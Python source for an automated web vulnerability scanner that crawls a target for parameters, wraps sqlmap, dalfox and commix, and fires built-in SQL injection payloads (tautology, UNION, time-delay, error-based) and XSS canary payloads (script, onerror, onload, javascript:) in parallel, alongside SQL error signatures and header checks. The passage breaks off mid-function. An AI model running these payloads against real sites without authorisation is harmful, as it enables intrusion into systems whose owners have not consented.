import hashlib, re, os, time, subprocess, json, urllib.parse, random, string, warnings
import httpx, pandas as pd, requests
from datetime import datetime
from bs4 import BeautifulSoup

warnings.filterwarnings('ignore')

DATASET_DIR        = ""
VULN_ML_DATASET_FILE = os.path.join(DATASET_DIR, "vulnerability_ml_dataset.csv")

_SQLI_INDICATORS = [
    'sqlmap identified the following injection point', 'parameter is vulnerable',
    'parameter appears to be', 'is vulnerable', 'injection point', 'back-end dbms:'
]
_SQLI_TYPES = [
    ('boolean-based blind', 'SQL Injection (Boolean-based Blind)'),
    ('time-based blind',    'SQL Injection (Time-based Blind)'),
    ('union query',         'SQL Injection (UNION Query)'),
    ('error-based',         'SQL Injection (Error-based)'),
]
_COMMIX_INDICATORS = [
    'vulnerable to command injection', 'command execution',
    'executed successfully', 'injection point found', 'is vulnerable', 'exploitation succeeded'
]
_SEV = {'sql injection': 10, 'command injection': 9, 'xss': 7}
_CONF = {'high': 1.0, 'medium': 0.7, 'low': 0.3, 'unknown': 0.5}

# ── Built-in SQL error patterns (covers MySQL, PostgreSQL, MSSQL, Oracle, SQLite) ─
_SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql_",  r"warning.*mysqli_",  r"warning.*pg_",
    r"unclosed quotation mark",  r"quoted string not properly terminated",
    r"microsoft.*odbc.*driver",  r"microsoft.*ole db.*provider",
    r"ora-\d{5}",  r"oracle.*error",  r"oracle.*driver",
    r"postgresql.*error",  r"pg_query\(\)",  r"pg_exec\(\)",
    r"sqlite.*error",  r"sqlite3\.operational",
    r"sql.*syntax.*error",  r"mysql_fetch",  r"mysql_num_rows",
    r"supplied argument is not a valid mysql",
    r"unterminated.*string.*literal",  r"invalid.*input.*syntax.*for.*type",
    r"mssql_query\(\)",  r"odbc.*sql.*server",
    r"db2.*sql.*error",  r"sybase.*error",
    r"jet.*database.*engine",  r"access.*database.*engine",
    r"division by zero",  r"invalid column name",
    r"unknown column",  r"no such column",  r"column.*not found",
    r"table.*doesn.t exist",  r"no such table",
    r"operand.*should contain.*column",
    r"subquery returns more than",  r"each.*must.*be.*followed",
    r"sql command not properly ended",
]

# ── Built-in SQLi payloads ─────────────────────────────────────────────────
_SQLI_PAYLOADS = [
    ("'",                           "error-based (single quote)"),
    ("\"",                          "error-based (double quote)"),
    ("' OR '1'='1",                 "boolean-based (OR tautology)"),
    ("' OR '1'='1' -- ",            "boolean-based (OR tautology comment)"),
    ("1 OR 1=1",                    "boolean-based (numeric OR)"),
    ("' UNION SELECT NULL-- ",      "UNION-based (single NULL)"),
    ("' UNION SELECT NULL,NULL-- ", "UNION-based (double NULL)"),
    ("1' ORDER BY 10-- ",          "ORDER BY probing"),
    ("1; WAITFOR DELAY '0:0:3'-- ","time-based MSSQL"),
    ("1' AND SLEEP(3)-- ",         "time-based MySQL"),
    ("1' AND pg_sleep(3)-- ",      "time-based PostgreSQL"),
    ("' AND 1=CONVERT(int,(SELECT @@version))-- ", "error-based MSSQL version"),
    ("' AND extractvalue(1,concat(0x7e,version()))-- ", "error-based MySQL extractvalue"),
]

# ── Built-in XSS payloads & canary ────────────────────────────────────────
_XSS_CANARY_PREFIX = "xSsT3sT"
_XSS_PAYLOADS = [
    ('<script>alert("{canary}")</script>',           "script tag"),
    ('"><img src=x onerror=alert("{canary}")>',      "img onerror"),
    ("'><svg onload=alert('{canary}')>",             "svg onload"),
    ('<body onload=alert("{canary}")>',              "body onload"),
    ('"><iframe src=javascript:alert("{canary}")>',  "iframe src"),
    ("javascript:alert('{canary}')",                 "javascript protocol"),
    ('"><details open ontoggle=alert("{canary}")>',  "details ontoggle"),
    ("{canary}",                                     "reflection check"),
]

# ── Security headers to check ─────────────────────────────────────────────
_REQUIRED_HEADERS = {
    'Content-Security-Policy':   'Prevents XSS and data injection',
    'Strict-Transport-Security': 'Forces HTTPS connections',
    'X-Content-Type-Options':    'Prevents MIME-type sniffing',
    'X-Frame-Options':           'Prevents clickjacking',
    'X-XSS-Protection':         'Browser XSS filter',
    'Referrer-Policy':           'Controls referrer info',
    'Permissions-Policy':        'Controls browser features',
}


# ═══════════════════════════════════════════════════════════════════════════
class URLVulnerabilityChecker:
# ═══════════════════════════════════════════════════════════════════════════

    def __init__(self):
        self.vulnerabilities_found = []
        self.scan_id  = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.scan_dir = os.path.join(DATASET_DIR, f"vuln_scan_{self.scan_id}")
        os.makedirs(self.scan_dir, exist_ok=True)
        self.previous_scan_data = None

    # ── Entry point ────────────────────────────────────────────────────────
    def check_vulnerabilities(self, url):
        print(f"\n{'='*60}\nCHECKING VULNERABILITIES FOR: {url}\n{'='*60}")
        print(f"[*] Scan ID: {self.scan_id}\n[*] Results: {self.scan_dir}")
        self.perform_vulnerability_scanning(url)
        self.generate_report(url)
        self.extract_vulnerability_features(url)
        self.show_vuln_dataset_stats()

    # ── SQLMap ─────────────────────────────────────────────────────────────
    def check_sql_injection_with_sqlmap(self):
        print("\n[+] Checking SQL Injection with SQLMap")
        script = "/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/script/run_sqlmap.sh"
        if not os.path.exists(script):
            print("    [-] SQLMap script not found"); return
        try:
            with open("sqli_parameters.txt") as f:
                urls = [l.strip() for l in f if l.strip()]
            if not urls: print("    [-] No URLs in sqli_parameters.txt"); return
            print(f"    [*] Testing {len(urls)} URL(s) in bulk mode")
            
            out_dir = os.path.join(os.path.abspath(self.scan_dir), "sqlmap_results")
            os.makedirs(out_dir, exist_ok=True)
            
            target_list = "sqli_parameters.txt"
            proc = subprocess.Popen(['bash', script, target_list, out_dir],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout:
                line_str = line.strip()
                if any(k in line_str.lower() for k in ['vulnerable','injection point','confirmed','payload:','parameter:','type:','backend dbms','testing connection','testing if']):
                    print(f"        {line_str}")
            proc.wait()
            
            if os.path.exists(out_dir):
                vulns = self.parse_sqlmap_results(target_list, out_dir)
                if vulns:
                    self.vulnerabilities_found.extend(vulns)
                    print(f"    [!] Confirmed SQLi: {len(vulns)}")
                    for v in vulns: print(f"        - {v['type']} in {v['parameter']}")
                else:
                    print("    [-] No SQLi confirmed")
            else:
                print("    [-] Could not find SQLMap output dir")
        except FileNotFoundError:
            print("    [-] sqli_parameters.txt not found")
        except Exception as e:
            print(f"    [-] Error: {e}")

    def parse_sqlmap_results(self, url_or_file, output_dir):
        vulns = []
        print(f"    [*] Parsing SQLMap results: {output_dir}")
        # Single log file — no --output-dir means no per-target subfolders
        log_file = os.path.join(output_dir, "sqlmap.log")
        if not os.path.exists(log_file):
            print(f"        [-] Log not found: {log_file}")
            return vulns
        try:
            content = open(log_file, encoding='utf-8', errors='ignore').read()
            is_vuln = any(p in content for p in ['is vulnerable', 'appears to be',
                          'sqlmap identified the following injection point', 'Parameter:'])
            is_fp   = 'false positive or unexploitable' in content.lower()
            if is_vuln and not is_fp:
                print(f"        [!] Vuln indicators found in sqlmap.log")
                self._extract_sqlmap_vulnerabilities(content, vulns)
            elif is_fp:
                print("        [-] False positive, ignoring")
            else:
                print("        [-] No vulnerability indicators in sqlmap.log")
        except Exception as e:
            print(f"        [-] Error reading sqlmap.log: {e}")
        print(f"    {'[!] Found' if vulns else '[-] No confirmed'} SQLi — {len(vulns)} vuln(s)")
        return vulns

    def _extract_sqlmap_vulnerabilities(self, content, vulns):
        lines = content.split('\n')
        cur_param = cur_type = cur_title = cur_payload = None
        seen = set()
        for i, raw in enumerate(lines):
            line = raw.strip()
            if line.startswith('Parameter:'):
                m = re.search(r'Parameter:\s*(\w+)', line)
                if m: cur_param = m.group(1); print(f"        [+] Param: {cur_param}")
            elif line.startswith('Type:'):
                m = re.search(r'Type:\s*(.+)', line)
                if m: cur_type = m.group(1).strip(); print(f"        [+] Type: {cur_type}")
            elif line.startswith('Title:'):
                m = re.search(r'Title:\s*(.+)', line)
                if m: cur_title = m.group(1).strip()
            elif line.startswith('Payload:'):
                m = re.search(r'Payload:\s*(.+)', line)
                if m: cur_payload = m.group(1).strip()
            if (line == '---' or i == len(lines)-1) and cur_param and cur_type:
                key = f"{cur_param}:{cur_type}"
                if key not in seen:
                    vulns.append({'type': f"SQL Injection ({cur_type})", 'parameter': cur_param,
                                  'payload': cur_payload or 'sqlmap_automated',
                                  'evidence': cur_title or f'SQLMap: {cur_type}',
                                  'tool': 'sqlmap', 'confidence': 'high'})
                    seen.add(key)
                    print(f"        [!] Added: SQL Injection ({cur_type}) in {cur_param}")
                cur_type = cur_title = cur_payload = None
        if not vulns and 'is vulnerable' in content:
            vulns.append({'type': 'SQL Injection', 'parameter': 'detected',
                          'payload': 'sqlmap_automated', 'evidence': 'SQLMap confirmed',
                          'tool': 'sqlmap', 'confidence': 'high'})

    # ── SQLMap file parsers (used by file-level checks) ────────────────────
    def _parse_sqlmap_file(self, file_path, vulns):
        try:
            content = open(file_path, encoding='utf-8', errors='ignore').read()
            if not any(ind in content for ind in _SQLI_INDICATORS): return False
            print(f"        [+] Indicators in {os.path.basename(file_path)}")
            lines, cur_param, seen = content.split('\n'), None, set()
            for line in lines:
                ll = line.lower()
                if 'parameter:' in ll:
                    m = re.search(r"parameter:\s*['\"]?([^'\"\n]+)", line, re.I)
                    if m: cur_param = m.group(1).strip(); seen.clear()
                for kw, label in _SQLI_TYPES:
                    if kw in ll and kw not in seen:
                        seen.add(kw)
                        key = f"{cur_param}:{label}"
                        if not any(v['parameter']==cur_param and v['type']==label for v in vulns):
                            vulns.append({'type': label, 'parameter': cur_param or 'multiple',
                                          'payload': 'sqlmap_automated',
                                          'evidence': f'In {os.path.basename(file_path)}',
                                          'tool': 'sqlmap', 'confidence': 'high'})
                            print(f"        [+] Added: {label} in {cur_param}")
            return True
        except Exception as e:
            print(f"        [-] Error: {e}"); return False

    def _check_sqlmap_file_for_vulns(self, file_path, vulns):
        try:
            content = open(file_path, encoding='utf-8', errors='ignore').read().lower()
            if not any(ind in content for ind in _SQLI_INDICATORS): return False
            lines, cur_param = content.split('\n'), None
            for line in lines:
                if 'parameter:' in line:
                    m = re.search(r"parameter:\s*['\"]?([^'\"\n]+)", line, re.I)
                    if m: cur_param = m.group(1)
                for kw, label in _SQLI_TYPES:
                    if kw in line:
                        vulns.append({'type': label, 'parameter': cur_param or 'multiple',
                                      'payload': 'sqlmap_automated',
                                      'evidence': f'In {os.path.basename(file_path)}',
                                      'tool': 'sqlmap', 'confidence': 'high'})
            return bool(vulns)
        except Exception as e:
            print(f"        [-] Error: {e}"); return False

    # ── SQLMap directory helpers ───────────────────────────────────────────
    def _find_and_process_sqlmap_results(self, url):
        base = "web_recon_dataset"
        if not os.path.exists(base): print("    [-] No web_recon_dataset"); return
        dirs = sorted(
            [os.path.join(base, d) for d in os.listdir(base)
             if os.path.isdir(os.path.join(base, d)) and d.startswith('sqlmap_scan_')],
            key=os.path.getmtime, reverse=True
        )
        if dirs: print(f"    [+] Latest SQLMap dir: {dirs[0]}"); self._process_sqlmap_results(dirs[0], url)
        else:    print("    [-] No SQLMap dirs found")

    def _process_sqlmap_results(self, output_dir, url):
        if not os.path.isdir(output_dir): print(f"    [-] Not found: {output_dir}"); return
        vulns = self.parse_sqlmap_results(url, output_dir)
        if vulns:
            self.vulnerabilities_found.extend(vulns)
            print(f"    [!] SQLi found: {len(vulns)}")
            for i, v in enumerate(vulns, 1):
                print(f"        {i}. {v['type']} in {v.get('parameter','unknown')}")
        else:
            print("    [-] No SQLi from SQLMap")
            for fn in os.listdir(output_dir):
                if os.path.isfile(os.path.join(output_dir, fn)): print(f"        - {fn}")

    def _find_sqlmap_output_files(self):
        base = "web_recon_dataset"
        if not os.path.exists(base): return []
        return [os.path.join(r, f)
                for d in os.listdir(base) if d.startswith('sqlmap_scan_')
                for r, _, fs in os.walk(os.path.join(base, d)) for f in fs]

    # ── XSS / Dalfox ──────────────────────────────────────────────────────
    def check_xss_with_dalfox(self):
        print("\n[+] Checking XSS with dalfox...")
        script     = "/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/script/run_dalfox.sh"
        out_file   = os.path.join(os.path.abspath(self.scan_dir), "dalfox_results.txt")
        os.makedirs(self.scan_dir, exist_ok=True)
        try:
            with open("xss_parameters.txt") as f:
                urls = [l.strip() for l in f if l.strip()]
            if not urls: print("[-] No URLs in xss_parameters.txt"); return False
            print(f"    [*] {len(urls)} URLs | output: {out_file}")
        except FileNotFoundError:
            print("[-] xss_parameters.txt not found"); return False
        except Exception as e:
            print(f"[-] Error: {e}"); return False
        try:
            if os.path.exists(out_file): os.remove(out_file)
            urls_file = os.path.join(os.path.abspath(self.scan_dir), "target_urls.txt")
            open(urls_file, 'w').write('\n'.join(urls))
            cmd = ['bash', script, urls_file, out_file]
            print(f"    [*] Running: {' '.join(cmd)}\n    " + "-"*40)
            res = subprocess.run(cmd, capture_output=True, text=True,
                                 cwd=os.path.dirname(script))
            for line in res.stdout.split('\n'):
                if line.strip() and any(x in line.lower() for x in ['vulnerable','poc','xss','found','completed']):
                    print(f"        {line}")
            print(f"    [*] rc={res.returncode}\n    " + "-"*40)
            return self._process_dalfox_results(out_file)
        except Exception as e:
            import traceback
            print(f"    [-] dalfox error: {e}\n{traceback.format_exc()}"); return False

    def _process_dalfox_results(self, output_file):
        if not os.path.exists(output_file): print(f"    [-] Not found: {output_file}"); return False
        try:
            content = open(output_file, encoding='utf-8', errors='ignore').read().strip()
            if not content: print("    [!] Output file empty"); return False
            print("    [XSS ANALYSIS]:")
            _patterns = [r'\[POC\]', r'\[V\].*vulnerable', r'triggered XSS',
                         r'XSS found', r'Payload.*worked', r'Successfully.*injected']
            found = []
            for line in content.split('\n'):
                lc = line.strip()
                for pat in _patterns:
                    if re.search(pat, lc, re.I):
                        if '--' in lc and 'http' not in lc: break
                        t = ("XSS (Stored)"    if '[S]' in lc or 'Stored' in lc else
                             "XSS (DOM-based)" if '[DOM]' in lc or 'DOM' in lc else "XSS (Reflected)")
                        m = re.search(r'https?://[^\s]+\?([^=]+)=', lc)
                        param = m.group(1) if m else 'unknown'
                        pm = re.search(r'FUZZ([^\s]+)', lc)
                        payload = urllib.parse.unquote(pm.group(1))[:100] if pm else 'dalfox_automated'
                        found.append({'type': t, 'parameter': param, 'payload': payload,
                                      'evidence': lc[:200], 'tool': 'dalfox', 'confidence': 'high'})
                        print(f"        [!] VULNERABILITY: {lc}"); break
            print(f"\n    [XSS SUMMARY]: {len(found)} total")
            if found:
                self.vulnerabilities_found.extend(found)
                r = sum(1 for v in found if 'Reflected' in v['type'])
                s = sum(1 for v in found if 'Stored'    in v['type'])
                d = sum(1 for v in found if 'DOM'       in v['type'])
                print(f"        Reflected:{r}  Stored:{s}  DOM:{d}")
                vf = os.path.join(self.scan_dir, "xss_vulnerabilities.txt")
                with open(vf, 'w') as f:
                    f.write("XSS VULNERABILITIES:\n" + "="*50 + "\n")
                    for v in found:
                        f.write(f"\nType:{v['type']}\nParam:{v['parameter']}\nPayload:{v['payload']}\n"
                                f"Evidence:{v['evidence']}\nTool:{v['tool']}\nConf:{v['confidence']}\n" + "-"*50 + "\n")
                print(f"    [+] Saved: {vf}")
                return True
            print("    [-] No XSS found"); return False
        except Exception as e:
            import traceback; traceback.print_exc()
            print(f"    [-] Error: {e}"); return False

    # ── Commix ────────────────────────────────────────────────────────────
    def check_command_injection_with_commix(self):
        print("\n[+] Checking Command Injection with Commix...")
        script = "/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/script/run_commix.sh"
        if not os.path.exists(script):
            print(f"    [-] Script not found: {script}"); return
        TIMEOUT = 3600
        try:
            if not os.path.exists("rce_parameters.txt"):
                print("    [-] rce_parameters.txt not found"); return
            with open("rce_parameters.txt") as f:
                urls = [l.strip() for l in f if l.strip()]
            if not urls: print("    [-] No URLs in rce_parameters.txt"); return
            print(f"    [*] {len(urls)} URLs | timeout: {TIMEOUT}s")
            subdir = os.path.join(self.scan_dir, "commix_results")
            os.makedirs(subdir, exist_ok=True)
            all_vulns = []
            for i, url in enumerate(urls, 1):
                print(f"    [{i}/{len(urls)}] Testing: {url}")
                uhash  = hashlib.md5(url.encode()).hexdigest()[:8]
                url_dir = os.path.join(subdir, f"scan_{uhash}")
                os.makedirs(url_dir, exist_ok=True)
                proc = subprocess.Popen(['bash', script, url, url_dir],
                                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                t0 = last_act = time.time()
                vuln_det, lines = False, []
                while True:
                    now = time.time()
                    if now - t0 > TIMEOUT:
                        print(f"    [!] Timeout"); proc.terminate(); break
                    if proc.poll() is not None:
                        print("    [+] Commix done"); break
                    try:
                        line = proc.stdout.readline()
                        if line:
                            line = line.strip(); lines.append(line); last_act = now
                            print(f"        {line}")
                            if any(ind in line.lower() for ind in _COMMIX_INDICATORS):
                                vuln_det = True; print("    [!] Potential vuln!")
                            if any(p in line.lower() for p in ['commix finished','scan completed',
                                                                 'all tests completed','finished at','no injection point']):
                                print("    [+] Completion detected"); break
                        elif now - last_act > 300:
                            files = os.listdir(url_dir) if os.path.exists(url_dir) else []
                            print(f"    [{'+'if files else '-'}] {'Output found' if files else 'No output'}, {'breaking' if files else 'waiting'}...")
                            if files: proc.terminate(); break
                            last_act = now
                    except Exception as e:
                        print(f"    [-] Read error: {e}"); break
                    time.sleep(0.1)
                try:   proc.wait(timeout=30)
                except subprocess.TimeoutExpired: proc.kill()
                all_vulns.extend(self._process_commix_results(url_dir, url, lines, vuln_det))
                print(f"    [+] Done in {time.time()-t0:.1f}s")
            if all_vulns:
                self.vulnerabilities_found.extend(all_vulns)
                print(f"    [!] Total CmdInj: {len(all_vulns)}")
            else:
                print("    [-] No CmdInj found")
        except Exception as e:
            print(f"    [-] Commix error: {e}")

    def _process_commix_results(self, output_dir, url, output_lines, vuln_detected):
        vulns = []
        if not os.path.exists(output_dir): return vulns
        for fn in os.listdir(output_dir):
            fp = os.path.join(output_dir, fn)
            if not os.path.isfile(fp): continue
            try:
                content = open(fp, encoding='utf-8', errors='ignore').read().lower()
                if any(ind in content for ind in _COMMIX_INDICATORS):
                    vulns.append({'type': 'Command Injection', 'url': url, 'parameter': 'multiple',
                                  'payload': 'commix_automated',
                                  'evidence': f'In {fn}', 'tool': 'Commix',
                                  'confidence': 'medium', 'file': fp})
                    print(f"        [!] Vuln in: {fn}"); break
            except Exception as e:
                print(f"        [-] Error: {e}")
        if vuln_detected and not vulns:
            out_text = "\n".join(output_lines).lower()
            if any(ind in out_text for ind in _COMMIX_INDICATORS[:3]):
                vulns.append({'type': 'Command Injection', 'url': url, 'parameter': 'multiple',
                              'payload': 'commix_automated', 'evidence': 'Real-time output',
                              'tool': 'Commix', 'confidence': 'medium'})
        print(f"        [{'+'if vulns else '-'}] {len(vulns)} vuln(s) for this URL")
        return vulns

    # ── Misc helpers ──────────────────────────────────────────────────────
    def detect_sql_errors(self, text):
        return any(re.search(p, text, re.I) for p in _SQL_ERROR_PATTERNS)

    # ── Smart parameter discovery ──────────────────────────────────────────
    def discover_parameters(self, url):
        """Crawl page to find real form params, link params, and endpoints."""
        print(f"\n[+] DISCOVERING PARAMETERS: {url}")
        targets = {'get': [], 'post': []}
        try:
            r = requests.get(url, timeout=10, verify=False, allow_redirects=True,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            soup = BeautifulSoup(r.text, 'html.parser')
            # ── Extract forms ──
            for form in soup.find_all('form'):
                act = form.get('action', '')
                method = form.get('method', 'get').lower()
                act_url = urllib.parse.urljoin(url, act) if act else url
                params = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name and inp.get('type', '').lower() not in ('submit', 'button', 'reset', 'image', 'hidden'):
                        params.append(name)
                # Also get hidden fields (often vulnerable)
                for inp in form.find_all('input', {'type': 'hidden'}):
                    name = inp.get('name')
                    if name: params.append(name)
                if params:
                    targets[method].append({'url': act_url, 'params': list(set(params))})
                    print(f"    [+] Form ({method.upper()}) → {act_url} params: {params}")
            # ── Extract link parameters ──
            seen_params = set()
            for a in soup.find_all('a', href=True):
                href = urllib.parse.urljoin(url, a['href'])
                parsed = urllib.parse.urlparse(href)
                if parsed.query and parsed.netloc == urllib.parse.urlparse(url).netloc:
                    for pname in urllib.parse.parse_qs(parsed.query):
                        if pname not in seen_params:
                            seen_params.add(pname)
                            targets['get'].append({'url': href.split('?')[0], 'params': [pname]})
            if seen_params:
                print(f"    [+] Link params: {list(seen_params)}")
            # ── Extract JS endpoints ──
            for script in soup.find_all('script'):
                if script.string:
                    for m in re.finditer(r'(?:fetch|axios|ajax|XMLHttpRequest)[^"\']*["\']([^"\']+\?[^"\']*)["\']', script.string):
                        ep = urllib.parse.urljoin(url, m.group(1))
                        p = urllib.parse.urlparse(ep)
                        if p.query:
                            targets['get'].append({'url': ep.split('?')[0],
                                                   'params': list(urllib.parse.parse_qs(p.query).keys())})
                            print(f"    [+] JS endpoint: {ep}")
            total = len(targets['get']) + len(targets['post'])
            print(f"    [*] Discovered: {total} targets ({len(targets['get'])} GET, {len(targets['post'])} POST)")
            if total == 0:
                print("    [*] No params found, using common param names as fallback")
                for p in ['id', 'search', 'q', 'query', 'page', 'user', 'name', 'cat', 'file', 'cmd', 'action']:
                    targets['get'].append({'url': url, 'params': [p]})
        except Exception as e:
            print(f"    [-] Discovery error: {e}")
            for p in ['id', 'search', 'q', 'page']:
                targets['get'].append({'url': url, 'params': [p]})
        return targets

    def _make_request(self, url, method='get', params=None, data=None):
        """Safe request wrapper with timeout and error handling."""
        try:
            kw = {'timeout': 8, 'verify': False, 'allow_redirects': True,
                  'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}}
            if method == 'post':
                return requests.post(url, data=data, **kw)
            else:
                return requests.get(url, params=params, **kw)
        except Exception:
            return None

    # ── Built-in SQLi checker ──────────────────────────────────────────────
    def check_sqli_builtin(self, url, targets=None):
        """Test for SQL injection using error-based and time-based detection."""
        print(f"\n[+] BUILT-IN SQL INJECTION CHECK")
        if not targets: targets = self.discover_parameters(url)
        vulns = []
        all_targets = [('get', t) for t in targets.get('get', [])] + [('post', t) for t in targets.get('post', [])]
        if not all_targets:
            print("    [-] No parameters to test"); return vulns

        # Get baseline response for comparison
        baseline = self._make_request(url)
        base_len = len(baseline.text) if baseline else 0
        base_time = baseline.elapsed.total_seconds() if baseline else 1

        import concurrent.futures

        tasks = []
        for method, target in all_targets:
            turl, params = target['url'], target['params']
            for param in params:
                print(f"    [{method.upper()}] Queuing tests for param: {param} → {turl}")
                for payload, ptype in _SQLI_PAYLOADS:
                    tasks.append((method, turl, param, payload, ptype))

        tested = len(tasks)

        def _worker(task):
            method, turl, param, payload, ptype = task
            is_time_based = 'time-based' in ptype
            try:
                if method == 'post':
                    data = {param: payload}
                    t0 = time.time()
                    r = self._make_request(turl, 'post', data=data)
                    elapsed = time.time() - t0
                else:
                    t0 = time.time()
                    r = self._make_request(turl, params={param: payload})
                    elapsed = time.time() - t0
                if not r: return None

                if self.detect_sql_errors(r.text):
                    matched = next((p for p in _SQL_ERROR_PATTERNS if re.search(p, r.text, re.I)), 'SQL error')
                    print(f"        [!] SQLi FOUND: {param} ({ptype}) — SQL error in response")
                    return {
                        'type': f'SQL Injection ({ptype})', 'parameter': param,
                        'payload': payload, 'evidence': f'SQL error: {matched}',
                        'tool': 'builtin_sqli', 'confidence': 'high',
                        'url': turl, 'method': method
                    }

                if is_time_based and elapsed > base_time + 2.5:
                    print(f"        [!] SQLi FOUND: {param} ({ptype}) — response delay {elapsed:.1f}s")
                    return {
                        'type': f'SQL Injection ({ptype})', 'parameter': param,
                        'payload': payload,
                        'evidence': f'Response delayed {elapsed:.1f}s (baseline {base_time:.1f}s)',
                        'tool': 'builtin_sqli', 'confidence': 'medium',
                        'url': turl, 'method': method
                    }

                if 'boolean' in ptype and baseline:
                    diff = abs(len(r.text) - base_len)
                    if diff > base_len * 0.3 and diff > 200:
                        print(f"        [?] Possible SQLi: {param} ({ptype}) — size diff {diff}b")
                        return {
                            'type': f'SQL Injection ({ptype})', 'parameter': param,
                            'payload': payload,
                            'evidence': f'Response size diff: {diff} bytes ({base_len}→{len(r.text)})',
                            'tool': 'builtin_sqli', 'confidence': 'low',
                            'url': turl, 'method': method
                        }
            except Exception as e:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for res in executor.map(_worker, tasks):
                if res and res['parameter'] not in [v['parameter'] for v in vulns]:
                    vulns.append(res)

        print(f"    [*] Tested {tested} payloads → {len(vulns)} SQLi finding(s)")
        return vulns

    # ── Built-in XSS checker ───────────────────────────────────────────────
    def check_xss_builtin(self, url, targets=None):
        """Test for reflected XSS using canary injection."""
        print(f"\n[+] BUILT-IN XSS CHECK")
        if not targets: targets = self.discover_parameters(url)
        vulns = []
        all_targets = [('get', t) for t in targets.get('get', [])] + [('post', t) for t in targets.get('post', [])]
        if not all_targets:
            print("    [-] No parameters to test"); return vulns

        import concurrent.futures

        canary = _XSS_CANARY_PREFIX + ''.join(random.choices(string.ascii_lowercase, k=6))
        tasks = []
        for method, target in all_targets:
            turl, params = target['url'], target['params']
            for param in params:
                for payload_tpl, ptype in _XSS_PAYLOADS:
                    payload = payload_tpl.replace('{canary}', canary)
                    tasks.append((method, turl, param, payload, ptype))
        tested = len(tasks)

        def _worker(task):
            method, turl, param, payload, ptype = task
            try:
                if method == 'post':
                    r = self._make_request(turl, 'post', data={param: payload})
                else:
                    r = self._make_request(turl, params={param: payload})
                if not r: return None

                if canary in r.text:
                    if ptype == 'reflection check':
                        if f'>{canary}<' in r.text or f'"{canary}"' in r.text or f"'{canary}'" in r.text:
                            conf = 'medium'
                        else:
                            conf = 'low'
                    else:
                        if payload in r.text:
                            conf = 'high'
                        elif canary in r.text:
                            conf = 'medium'
                        else:
                            return None
                            
                    print(f"        [!] XSS FOUND: {param} ({ptype}) — conf:{conf}")
                    return {
                        'type': f'XSS (Reflected - {ptype})', 'parameter': param,
                        'payload': payload, 'evidence': f'Canary {canary} reflected in response',
                        'tool': 'builtin_xss', 'confidence': conf,
                        'url': turl, 'method': method
                    }
            except Exception:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for res in executor.map(_worker, tasks):
                if res and res['parameter'] not in [v['parameter'] for v in vulns]:
                    vulns.append(res)

        print(f"    [*] Tested {tested} payloads → {len(vulns)} XSS finding(s)")
        return vulns

    # ── Security headers check ─────────────────────────────────────────────
    def check_headers_vulns(self, url):
        """Check for missing security headers and information disclosure."""
        print(f"\n[+] SECURITY HEADERS CHECK")
        vulns = []
        try:
            r = requests.get(url, timeout=10, verify=False, allow_redirects=True,
                             headers={'User-Agent': 'Mozilla/5.0'})
            resp_headers = {k.lower(): v for k, v in r.headers.items()}

            # Check missing security headers
            missing = []
            for hdr, desc in _REQUIRED_HEADERS.items():
                if hdr.lower() not in resp_headers:
                    missing.append(f"{hdr} ({desc})")
            if missing:
                vulns.append({
                    'type': 'Missing Security Headers', 'parameter': 'headers',
                    'payload': 'N/A', 'evidence': f"Missing: {', '.join(missing)}",
                    'tool': 'builtin_headers', 'confidence': 'high'
                })
                print(f"    [!] Missing {len(missing)} security headers:")
                for m in missing: print(f"        - {m}")

            # Check information disclosure
            server = resp_headers.get('server', '')
            powered = resp_headers.get('x-powered-by', '')
            if server:
                vulns.append({
                    'type': 'Information Disclosure (Server Banner)', 'parameter': 'Server',
                    'payload': 'N/A', 'evidence': f'Server: {server}',
                    'tool': 'builtin_headers', 'confidence': 'medium'
                })
                print(f"    [!] Server disclosed: {server}")
            if powered:
                vulns.append({
                    'type': 'Information Disclosure (X-Powered-By)', 'parameter': 'X-Powered-By',
                    'payload': 'N/A', 'evidence': f'X-Powered-By: {powered}',
                    'tool': 'builtin_headers', 'confidence': 'medium'
                })
                print(f"    [!] X-Powered-By disclosed: {powered}")

            # Check for CORS misconfiguration
            acao = resp_headers.get('access-control-allow-origin', '')
            if acao == '*':
                vulns.append({
                    'type': 'CORS Misconfiguration', 'parameter': 'Access-Control-Allow-Origin',
                    'payload': 'N/A', 'evidence': 'Wildcard (*) CORS allowed',
                    'tool': 'builtin_headers', 'confidence': 'medium'
                })
                print(f"    [!] Wildcard CORS: Access-Control-Allow-Origin: *")

            # Check cookie security
            for cookie in r.cookies:
                issues = []
                if not cookie.secure: issues.append('missing Secure flag')
                if 'httponly' not in str(cookie).lower(): issues.append('missing HttpOnly flag')
                if issues:
                    vulns.append({
                        'type': 'Insecure Cookie', 'parameter': cookie.name,
                        'payload': 'N/A', 'evidence': f"Cookie '{cookie.name}': {', '.join(issues)}",
                        'tool': 'builtin_headers', 'confidence': 'medium'
                    })
                    print(f"    [!] Insecure cookie '{cookie.name}': {', '.join(issues)}")

            if not vulns:
                print("    [+] No header vulnerabilities found")
        except Exception as e:
            print(f"    [-] Header check error: {e}")
        return vulns

    def _calculate_avg_confidence(self, tool):
        tvulns = [v for v in self.vulnerabilities_found if v.get('tool') == tool]
        if not tvulns: return 0
        return sum(_CONF.get(v.get('confidence','unknown'), 0.5) for v in tvulns) / len(tvulns)

    def _calculate_days_since_prev_scan(self):
        try:
            ts = self.previous_scan_data['data'].get('timestamp')
            if ts: return (datetime.now() - datetime.fromisoformat(ts.replace('Z','+00:00'))).days
        except Exception: pass
        return 0

    # ── Dataset / features ────────────────────────────────────────────────
    def save_vulnerability_dataset(self, features):
        try:
            df_new = pd.DataFrame([features])
            if os.path.exists(VULN_ML_DATASET_FILE) and os.path.getsize(VULN_ML_DATASET_FILE):
                try: df_new = pd.concat([pd.read_csv(VULN_ML_DATASET_FILE), df_new], ignore_index=True)
